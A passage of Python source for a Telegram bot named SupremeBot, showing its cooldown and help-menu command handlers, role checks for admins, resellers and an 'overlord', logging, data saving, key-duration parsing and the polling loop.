    stats["peak_active_users"] = max(stats["peak_active_users"], active_users_count)
    chat_type = 'group' if message.chat.type in ['group', 'supergroup'] else 'private'

    response = (
        f"━━━━━━━━━━━━━━━━━━━━━━━━━\n"
        f"<b><i>⏳ Current Cooldown</i></b>\n"
        f"<b><i>⏱️ Cooldown: {COOLDOWN_PERIOD} seconds</i></b>\n"
        f"<b><i>👤 User: @{username} (UserID: {user_id})</i></b>\n"
        f"<b><i>📍 Chat Type: {chat_type.capitalize()}</i></b>\n"
        f"<b><i>📅 Timestamp: {datetime.datetime.now(IST).strftime('%Y-%m-%d %I:%M:%S %p')}</i></b>\n"
        f"<b><i>⏱️ Bot Uptime: {calculate_uptime()}</i></b>\n"
        f"<b><i>{random.choice(CYBERPUNK_QUOTES)}</i></b>\n"
        f"━━━━━━━━━━━━━━━━━━━━━━━━━"
    )
    safe_reply(bot, message, response)
    log_action(user_id, username, "/checkcooldown", "", response)

@bot.message_handler(commands=['help'])
def help_command(message):
    user_id = str(message.from_user.id)
    username = message.from_user.username or f"UserID_{user_id}"
    stats["command_usage"]["help"] += 1
    stats["total_users"].add(user_id)
    stats["active_users"].append({"user_id": user_id, "last_active": datetime.datetime.now(IST)})
    active_users_count = update_active_users()
    stats["peak_active_users"] = max(stats["peak_active_users"], active_users_count)
    chat_type = 'group' if message.chat.type in ['group', 'supergroup'] else 'private'

    response = (
        f"━━━━━━━━━━━━━━━━━━━━━━━━━\n"
        f"<b><i>📜 SupremeBot Help Menu</i></b>\n"
        f"<b><i>👤 User: @{username} (UserID: {user_id})</i></b>\n"
        f"<b><i>📍 Chat Type: {chat_type.capitalize()}</i></b>\n"
        f"━━━━━━━━━━━━━━━━━━━━━━━━━\n"
        f"<b><i>📋 General Commands:</i></b>\n"
        f"<b><i>/start - Welcome message dekho</i></b>\n"
        f"<b><i>/myinfo - Apni details check karo</i></b>\n"
        f"<b><i>/redeem <key> - Key redeem karo</i></b>\n"
        f"<b><i>/feedback <message> - Feedback bhejo</i></b>\n"
        f"<b><i>/checkcooldown - Cooldown time dekho</i></b>\n"
        f"<b><i>/help - Yeh menu dekho</i></b>\n"
    )

    if is_admin(user_id, username) or is_overlord(user_id, username):
        response += (
            f"<b><i>🔐 Admin Commands:</i></b>\n"
            f"<b><i>/logs - Recent bot logs dekho</i></b>\n"
            f"<b><i>/users - Authorized users ki list</i></b>\n"
            f"<b><i>/resellers - Resellers ki list</i></b>\n"
            f"<b><i>/setcooldown <seconds> - Cooldown set karo</i></b>\n"
        )

    if is_overlord(user_id, username):
        response += (
            f"<b><i>👑 Overlord Commands:</i></b>\n"
            f"<b><i>/stats - Bot ke stats dekho</i></b>\n"
            f"<b><i>/addadmin <user_id or @username> - Admin add karo</i></b>\n"
            f"<b><i>/removeadmin <user_id or @username> - Admin hatao</i></b>\n"
            f"<b><i>/checkadmin - Admins ki list</i></b>\n"
            f"<b><i>/addreseller <user_id> - Reseller add karo</i></b>\n"
            f"<b><i>/removereseller <user_id> - Reseller hatao</i></b>\n"
            f"<b><i>/addbalance <user_id> <amount> - Reseller balance add karo</i></b>\n"
            f"<b><i>/genkey <duration> [context] - Key generate karo</i></b>\n"
        )

    if user_id in resellers:
        response += (
            f"<b><i>💰 Reseller Commands:</i></b>\n"
            f"<b><i>/genkey <duration> [context] - Key generate karo</i></b>\n"
        )

    response += (
        f"━━━━━━━━━━━━━━━━━━━━━━━━━\n"
        f"<b><i>📅 Timestamp: {datetime.datetime.now(IST).strftime('%Y-%m-%d %I:%M:%S %p')}</i></b>\n"
        f"<b><i>⏱️ Bot Uptime: {calculate_uptime()}</i></b>\n"
        f"<b><i>{random.choice(CYBERPUNK_QUOTES)}</i></b>\n"
        f"━━━━━━━━━━━━━━━━━━━━━━━━━"
    )
    safe_reply(bot, message, response)
    log_action(user_id, username, "/help", "", response)

# Helper Functions
def is_admin(user_id, username):
    return user_id in admin_id or (username and f"@{username.lower()}" in admin_usernames)

def is_overlord(user_id, username):
    return user_id in OVERLORD_IDS or (username and f"@{username.lower()}" in OVERLORD_USERNAMES)

def calculate_uptime():
    uptime_seconds = (datetime.datetime.now(IST) - BOT_START_TIME).total_seconds()
    days, remainder = divmod(int(uptime_seconds), 86400)
    hours, remainder = divmod(remainder, 3600)
    minutes, seconds = divmod(remainder, 60)
    return f"{days}d {hours}h {minutes}m {seconds}s"

def update_active_users():
    now = datetime.datetime.now(IST)
    active_users = [user for user in stats["active_users"] if (now - user["last_active"]).total_seconds() <= 300]
    stats["active_users"] = active_users
    return len(active_users)

def safe_reply(bot, message, text):
    try:
        bot.reply_to(message, text, parse_mode="HTML")
    except Exception as e:
        log_action("system", "system", "safe_reply", "", f"Error: {str(e)}")

def log_action(user_id, username, command, details, response, error=None):
    with open(LOG_FILE, 'a', encoding='utf-8') as f:
        log_entry = (
            f"UserID: {user_id}\n"
            f"Username: @{username}\n"
            f"Command: {command}\n"
            f"Details: {details}\n"
            f"Response: {response}\n"
        )
        if error:
            log_entry += f"Error: {error}\n"
        log_entry += f"Timestamp: {datetime.datetime.now(IST).strftime('%Y-%m-%d %I:%M:%S %p')}\n"
        log_entry += "----------------------------------------\n"
        f.write(log_entry)

def save_data():
    data = {
        "users": users,
        "authorized_users": authorized_users,
        "resellers": resellers,
        "keys": keys,
        "stats": stats,
        "feedbacks": feedbacks,
        "admin_id": list(admin_id),
        "admin_usernames": list(admin_usernames)
    }
    with open(DATA_FILE, 'w', encoding='utf-8') as f:
        json.dump(data, f, indent=4)

def parse_duration(duration):
    if duration == "1min":
        return 1, 0, 0, 0
    elif duration == "1h":
        return 0, 1, 0, 0
    elif duration == "1d":
        return 0, 0, 1, 0
    elif duration == "7d":
        return 0, 0, 7, 0
    elif duration == "1m":
        return 0, 0, 0, 1
    return None, None, None, None

def add_time_to_current_date(minutes=0, hours=0, days=0, months=0):
    return datetime.datetime.now(IST) + relativedelta(months=months, days=days, hours=hours, minutes=minutes)

# Main Bot Polling Loop
if __name__ == "__main__":
    print("SupremeBot starting...")
    try:
        bot.polling(none_stop=True, interval=0)
    except Exception as e:
        print(f"Bot polling error: {e}")
        log_action("system", "system", "polling", "", f"Error: {str(e)}")
        time.sleep(5)
        bot.polling(none_stop=True, interval=0)